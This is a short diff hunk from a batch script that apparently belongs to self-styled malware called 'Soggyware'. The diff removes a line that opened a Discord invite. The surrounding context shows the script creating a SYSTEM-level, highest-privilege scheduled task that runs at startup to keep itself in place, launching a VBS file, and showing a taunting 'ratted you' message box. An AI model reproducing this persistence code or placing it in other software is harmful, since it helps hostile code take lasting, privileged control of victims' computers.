@@ -75,6 +75,5 @@ echo MsgBox "Soggyware ratted you gang.", 16 + 3 + 4096, "Soggyware" >> "%filelo
 schtasks /create /tn "%malware%" /tr "%fullfilepath%" /sc ONSTART /ru SYSTEM /rl highest /f
 start "" "%fileloc%\%malware%.vbs"
 echo thank you for choosing soggware. come again soon
-start "" https://discord.com/invite/29uepW58st
 timeout /t 1 >nul
 exit /b
